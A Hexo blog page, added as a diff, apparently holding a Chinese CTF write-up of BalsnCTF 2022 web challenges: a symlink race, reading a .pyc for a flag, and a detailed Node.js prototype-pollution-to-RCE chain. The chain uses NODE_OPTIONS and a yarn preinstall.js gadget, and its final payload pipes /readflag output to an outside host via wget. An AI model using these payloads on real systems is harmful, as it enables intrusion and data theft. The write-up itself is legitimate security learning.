@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="BalsnCTF2022 web wp在天哥的带领下简单的看了一下题，然后天哥ak了web，tqltql，我太弱了 my first appnextjs写的站，我是js垃圾，我看这个玩意以为是后端框架，然后找了半天没找到交互的点，完全不知道怎么打，结果天哥和我说这个玩意是前端框架，定义的变量也都打包到前端里去了，直接f12就能找到。。。。学习了 Health Check1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BalsnCTF2022 web wp">
+<meta property="og:url" content="https://blog.z3ratu1.cn/BalsnCTF2022web%20wp.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="BalsnCTF2022 web wp在天哥的带领下简单的看了一下题，然后天哥ak了web，tqltql，我太弱了 my first appnextjs写的站，我是js垃圾，我看这个玩意以为是后端框架，然后找了半天没找到交互的点，完全不知道怎么打，结果天哥和我说这个玩意是前端框架，定义的变量也都打包到前端里去了，直接f12就能找到。。。。学习了 Health Check1">
+<meta property="og:locale">
+<meta property="article:published_time" content="2022-09-07T03:40:06.000Z">
+<meta property="article:modified_time" content="2022-09-08T07:54:12.471Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="JavaScript">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/BalsnCTF2022web%20wp.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>BalsnCTF2022 web wp | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/BalsnCTF2022web%20wp.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BalsnCTF2022 web wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-09-07 11:40:06" itemprop="dateCreated datePublished" datetime="2022-09-07T11:40:06+08:00">2022-09-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-09-08 15:54:12" itemprop="dateModified" datetime="2022-09-08T15:54:12+08:00">2022-09-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/BalsnCTF2022web%20wp.html" class="post-meta-item leancloud_visitors" data-flag-title="BalsnCTF2022 web wp" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/BalsnCTF2022web%20wp.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/BalsnCTF2022web%20wp.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="BalsnCTF2022-web-wp"><a href="#BalsnCTF2022-web-wp" class="headerlink" title="BalsnCTF2022 web wp"></a>BalsnCTF2022 web wp</h1><p>在天哥的带领下简单的看了一下题，然后天哥ak了web，tqltql，我太弱了</p>
+<h2 id="my-first-app"><a href="#my-first-app" class="headerlink" title="my first app"></a>my first app</h2><p>nextjs写的站，我是js垃圾，我看这个玩意以为是后端框架，然后找了半天没找到交互的点，完全不知道怎么打，结果天哥和我说这个玩意是前端框架，定义的变量也都打包到前端里去了，直接f12就能找到。。。。<br>学习了</p>
+<h2 id="Health-Check1"><a href="#Health-Check1" class="headerlink" title="Health Check1"></a>Health Check1</h2><p>扫目录扫到后台，可以传一个100k以内的文件上去执行，直接弹一个shell回来看源码，第一个flag在flag1.py里面，flag1.py是被import了的，所以会生成pyc，虽然flag1被改成了不可读，但是pyc默认可读，直接读pyc就能拿到flag</p>
+<p>python生成pyc的逻辑就是当一个文件被作为模块import的时候，会认为其会被重用，就会生成pyc</p>
+<h2 id="Health-Check2"><a href="#Health-Check2" class="headerlink" title="Health Check2"></a>Health Check2</h2><p>和1共一个环境，上去看了源码可以知道是对你传的压缩包解压缩，然后执行里面的可执行文件，如果里面有一个docker-entry文件，就把当前目录挂载到docker里面然后以一个中等权限用户进去执行docker-entry，否则就是以nobody启动里面的文件，也就是1里面弹的shell，flag2的权限比较高，nobody读不了，docker那个操作魔幻的一比，让人看不懂，但是看了半天感觉逃逸不出来。<br>然后还提供了一个读status.json的功能，但是在读之前会resolve一下这个文件是不是在当前目录下（就是防软链接）<br>然后直接条件竞争就行了。。。当前目录任何用户可写，传一个文件直接反复删写status.json在普通文件和指向flag的软链接间横跳就行，加上是服务去读这个文件返回，权限也足够。竞争一波就能拿到flag</p>
+<h2 id="2linenodejs"><a href="#2linenodejs" class="headerlink" title="2linenodejs"></a>2linenodejs</h2><p>这个题挺究极的。。。居然也能出13个队，太牛逼了，或者说我太垃圾了</p>
+<p>主要代码就这点</p>
+<pre class=" language-js"><code class="language-js">process<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+process<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'readable'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+  <span class="token keyword">try</span><span class="token punctuation">{</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'HTTP/1.1 200 OK\nContent-Type: text/html\nConnection: Close\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> json <span class="token operator">=</span> process<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/\?(.*?)\ /</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+    obj <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`JSON: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>json<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">, Object:`</span></span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./index'</span><span class="token punctuation">)</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">{</span>
+    <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./usage'</span><span class="token punctuation">)</span>
+  <span class="token punctuation">}</span><span class="token keyword">finally</span><span class="token punctuation">{</span>
+    process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>index的功能就是把解析的obj进行一个值合并操作，原型链污染的功能。服务是用socat启动的，所以直接从stdin获取数据。并且每次访问启动一个新进程，也不怕污染坏了环境</p>
+<p>显然应该是原型链污染然后可以在require处进行些什么操作，所以第一步是想办法在污染之后能报错进catch。。。。太垃圾了按了半天没按出来一个报错，这里有两个办法<br>一个是对<code>&#123;&#125;.__proto__.__proto__</code>赋值，赋值为对象和数组都会报错，但是赋值为字符串和数字就不会。。。玄学，理论上来说<code>&#123;&#125;.__proto__</code>应该是那个最顶级的所谓<code>Object</code>的东西，它已经是原型链的顶端了，再proto访问到的是null<br>另一个是另外声明一个变量，令其值为null，<code>&quot;a&quot;:null</code>，因为这里会对每个属性进行遍历，null是不能被遍历的，就会爆炸</p>
+<p>接下来，就要看require处的原型链污染能做到什么程度了</p>
+<h3 id="nodejs原型链污染"><a href="#nodejs原型链污染" class="headerlink" title="nodejs原型链污染"></a>nodejs原型链污染</h3><p>需要跟一下究极底层，可以直接用webstorm调，但是每次调完之后第二次调试就会报一个极其玄幻的错误<code>Illegal char :&gt; at index 4: node:internal/modules/cjs/loader</code>，需要重启webstorm才能重新调。不知道怎么回事捏</p>
+<p>另一个是天哥教的方法，直接<code>node --inspect ./server.js</code>启动，然后到Chrome里面去访问<code>chrome://inspect/</code>，可以连接到node的调试端口进行调试，就是Chrome的那个console界面调试，说实话用起来不太习惯。。。</p>
+<p>总之跟一下require底层一点的实现，可以很容易的找到解析文件名的调用栈</p>
+<pre><code>require()-&gt;Module.require()-&gt;Module._load()-&gt;Module._resolveFilename()
+</code></pre>
+<p>这里有两个地方返回解析出来的文件名</p>
+<pre class=" language-js"><code class="language-js">  <span class="token keyword">const</span> parentPath <span class="token operator">=</span> <span class="token function">trySelfParentPath</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">const</span> selfResolved <span class="token operator">=</span> <span class="token function">trySelf</span><span class="token punctuation">(</span>parentPath<span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>selfResolved<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">const</span> cacheKey <span class="token operator">=</span> request <span class="token operator">+</span> <span class="token string">'\x00'</span> <span class="token operator">+</span>
+         <span class="token punctuation">(</span>paths<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">1</span> <span class="token operator">?</span> paths<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token function">ArrayPrototypeJoin</span><span class="token punctuation">(</span>paths<span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    Module<span class="token punctuation">.</span>_pathCache<span class="token punctuation">[</span>cacheKey<span class="token punctuation">]</span> <span class="token operator">=</span> selfResolved<span class="token punctuation">;</span>
+    <span class="token keyword">return</span> selfResolved<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+
+  <span class="token comment" spellcheck="true">// Look up the filename first, since that's the cache key.</span>
+  <span class="token keyword">const</span> filename <span class="token operator">=</span> Module<span class="token punctuation">.</span><span class="token function">_findPath</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> paths<span class="token punctuation">,</span> isMain<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>filename<span class="token punctuation">)</span> <span class="token keyword">return</span> filename<span class="token punctuation">;</span>
+</code></pre>
+<p>进入trySelf，发现可以原型链污染的点，出现了一个空对象（我当时真的没有注意到。。。。以前污染都是考虑对象是不是访问了奇怪的属性，没有意识到空对象就是完美的污染对象。。。太弱了）</p>
+<pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> <span class="token punctuation">{</span> data<span class="token punctuation">:</span> pkg<span class="token punctuation">,</span> path<span class="token punctuation">:</span> pkgPath <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">readPackageScope</span><span class="token punctuation">(</span>parentPath<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+</code></pre>
+<p>readPackageScope会从底往上依次搜索package.json，并尝试从package.json中解析出包对应的文件，当找不到时返回false，而当前环境下刚好没有package.json，因此，就能够将其赋值为空对象，进而控制pkg和pkgPath的值</p>
+<p>简单跟一下可以看到，pkg里面有两个需要用到的变量，一个是name，这个必须和require加载的那个文件一致或者打头，不然直接挂，另一个是exports，这个不太看得懂。。。但是可以在<code>packageExportsResolve</code>中看到一个<code>const target = exports[packageSubpath];</code>，target应该就是实际要被加载的文件，而<code>packageSubpath</code>在之前被赋值为<code>.</code>，所以令exports为一个<code>&#123;&quot;.&quot;:&quot;file&quot;&#125;</code>的对象，在该函数中调用了<code>isConditionalExportsMainSugar</code></p>
+<pre class=" language-js"><code class="language-js">  <span class="token keyword">let</span> exports <span class="token operator">=</span> packageConfig<span class="token punctuation">.</span>exports<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isConditionalExportsMainSugar</span><span class="token punctuation">(</span>exports<span class="token punctuation">,</span> packageJSONUrl<span class="token punctuation">,</span> base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    exports <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">'.'</span><span class="token punctuation">:</span> exports <span class="token punctuation">}</span><span class="token punctuation">;</span>
+</code></pre>
+<p>也可以将exports变为如下对象，该方法在exports是一个数组是返回true</p>
+<p>所以任意文件加载的payload大致如下</p>
+<pre><code>a.__proto__.data = &#123;&quot;name&quot;: &quot;./usage&quot;, &quot;exports&quot;:[&quot;./target.js&quot;]&#125;
+a.__proto__.path = &quot;target file path&quot;
+</code></pre>
+<p>接下来就要找一个加载后可以rce的文件了</p>
+<p>接下来是一些前置知识</p>
+<h3 id="node环境变量可控rce"><a href="#node环境变量可控rce" class="headerlink" title="node环境变量可控rce"></a>node环境变量可控rce</h3><p>node在启动时可以接受一个名为NODE_OPTIONS的环境变量，其中有一个<code>--require</code>选项，可以指定require指定的文件，不需要js后缀，可以做到任意文件包含</p>
+<p>而进程的环境变量可以在<code>/proc/self/environ</code>中获取，在node启动时添加两个环境变量，分别为<code>aaa=&lt;code here&gt;//</code>和<code>NODE_OPTIONS=--require /proc/self/environ</code>即可实现rce，第一个环境变量末尾用注释把剩下的环境变量内容注释掉</p>
+<h3 id="原型链污染-child-process调用到RCE"><a href="#原型链污染-child-process调用到RCE" class="headerlink" title="原型链污染+child_process调用到RCE"></a>原型链污染+child_process调用到RCE</h3><p>天哥说这个是被玩烂的老把戏，但是我真的是头一次听说。。。。</p>
+<p>在child_process中，我们可以提供新拉起的process的<strong>环境变量</strong>和执行的文件，如果可以指定执行的文件是node，并且在env中添加如上<code>--require /proc/self/environ</code>等变量，即可做到任意命令执行，所以，原型链污染需要注意的点即为执行的文件和执行的环境变量</p>
+<p>child_process提供了七个对外的函数进行命令执行，分别是exec, execFile, execFileSync, execSync, fork, spawn, spawnSync</p>
+<p>fork调spawn，exec调用execFile调用spawn<br>execFileSync调用spawnSync，execSync也调spawnSync<br>最终都是归到spawn(Sync)上，而spawn(Sync)分别调用内部实现，而在spawn(Sync)的开头中调用了normalizeSpawnArguments，对传入的options进行处理，其中有这么一段</p>
+<pre class=" language-javascript"><code class="language-javascript">  <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>shell<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">const</span> command <span class="token operator">=</span> <span class="token function">ArrayPrototypeJoin</span><span class="token punctuation">(</span><span class="token punctuation">[</span>file<span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// Set the shell, switches, and commands.</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>process<span class="token punctuation">.</span>platform <span class="token operator">===</span> <span class="token string">'win32'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> options<span class="token punctuation">.</span>shell <span class="token operator">===</span> <span class="token string">'string'</span><span class="token punctuation">)</span>
+        file <span class="token operator">=</span> options<span class="token punctuation">.</span>shell<span class="token punctuation">;</span>
+      <span class="token keyword">else</span>
+        file <span class="token operator">=</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>comspec <span class="token operator">||</span> <span class="token string">'cmd.exe'</span><span class="token punctuation">;</span>
+      <span class="token comment" spellcheck="true">// '/d /s /c' is used only for cmd.exe.</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">RegExpPrototypeTest</span><span class="token punctuation">(</span><span class="token regex">/^(?:.*\\)?cmd(?:\.exe)?$/i</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'/d'</span><span class="token punctuation">,</span> <span class="token string">'/s'</span><span class="token punctuation">,</span> <span class="token string">'/c'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token string">`"</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>command<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"`</span></span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        windowsVerbatimArguments <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'-c'</span><span class="token punctuation">,</span> command<span class="token punctuation">]</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> options<span class="token punctuation">.</span>shell <span class="token operator">===</span> <span class="token string">'string'</span><span class="token punctuation">)</span>
+        file <span class="token operator">=</span> options<span class="token punctuation">.</span>shell<span class="token punctuation">;</span>
+      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>process<span class="token punctuation">.</span>platform <span class="token operator">===</span> <span class="token string">'android'</span><span class="token punctuation">)</span>
+        file <span class="token operator">=</span> <span class="token string">'/system/bin/sh'</span><span class="token punctuation">;</span>
+      <span class="token keyword">else</span>
+        file <span class="token operator">=</span> <span class="token string">'/bin/sh'</span><span class="token punctuation">;</span>
+      args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'-c'</span><span class="token punctuation">,</span> command<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
+</code></pre>
+<p>file即为最终执行的文件，可以看到，当options.shell存在时，会直接将执行的文件变为options.shell，然后原本的command则变成了-c后的参数，而options需要主动传入，默认不存在，会被初始化成空对象，可供原型链污染，或者传入了options但shell属性不存在，也可以进行污染，控制实际执行的文件（但不能控制参数，所以还是只能走node+环境变量rce）<br>简单测下来，除了exec和execFile以外，剩下几个函数都能打</p>
+<p>虽然fork中指定了execPath，并令shell为false，但该execPath从options中取，仍然可控<br>execSync和execFileSync没有操作options，可以控制<br>execFile比较无情，居然手动初始化了options</p>
+<pre class=" language-javascript"><code class="language-javascript">  options <span class="token operator">=</span> <span class="token punctuation">{</span>
+    encoding<span class="token punctuation">:</span> <span class="token string">'utf8'</span><span class="token punctuation">,</span>
+    timeout<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
+    maxBuffer<span class="token punctuation">:</span> MAX_BUFFER<span class="token punctuation">,</span>
+    killSignal<span class="token punctuation">:</span> <span class="token string">'SIGTERM'</span><span class="token punctuation">,</span>
+    cwd<span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
+    env<span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
+    shell<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+    <span class="token operator">...</span>options
+  <span class="token punctuation">}</span><span class="token punctuation">;</span>
+</code></pre>
+<p>虽然最后的<code>...options</code>能覆盖之前的内容，但原型链污染只有在找不到值时向上找，options被污染了也只是个空对象，污染的值不能进行覆盖，打不了</p>
+<p>exec调用的是execFile，但是先来了个normalizeExecArgs，这个里面又给options.shell赋值上去了，这样子就又可以把之前的shell覆盖回去，能够执行任意一个文件，但是参数又不能控制，由于env覆盖不了，执行node也没法做到包含js文件</p>
+<h3 id="寻找可利用文件"><a href="#寻找可利用文件" class="headerlink" title="寻找可利用文件"></a>寻找可利用文件</h3><p>给了dockerfile，是<code>node:18.8.0-alpine3.16</code>，直接进去找.js文件，发现里面是有npm和yarn的（虽然yarn只有几个文件），然后直接在里面搜child_process，看看有没有文件直接调用了child_process的方法，可以找到一个<code>/opt/yarn-v1.22.19/preinstall.js</code><br>在环境变量中有<code>npm_config_global</code>的时候会调用child_process的execFileSync方法，没传options，可以控制，环境变量默认也没有这个变量，均可污染</p>
+<pre><code>if (process.env.npm_config_global) &#123;
+    var cp = require(&#39;child_process&#39;);
+    var fs = require(&#39;fs&#39;);
+    var path = require(&#39;path&#39;);
+
+    try &#123;
+        var targetPath = cp.execFileSync(process.execPath, [process.env.npm_execpath, &#39;bin&#39;, &#39;-g&#39;], &#123;
+            encoding: &#39;utf8&#39;,
+            stdio: [&#39;ignore&#39;, undefined, &#39;ignore&#39;],
+        &#125;).replace(/\n/g, &#39;&#39;);
+</code></pre>
+<p>当然，不控制启动文件，这里process.execPath就是node，并且还有一个node的命令行参数<code>process.env.npm_execpath</code>可控，而node命令行参数中有一个eval选项，也是直接执行命令</p>
+<p>因此，构造出如下payload</p>
+<pre><code>&#123;
+    &quot;__proto__&quot;: &#123;
+        &quot;env&quot;: &#123;
+            &quot;payload&quot;: &quot;require(&#39;child_process&#39;).execSync(&#39;wget$&#123;IFS&#125;http://www.z3ratu1.cn:10001/`/readflag`&#39;)//&quot;,
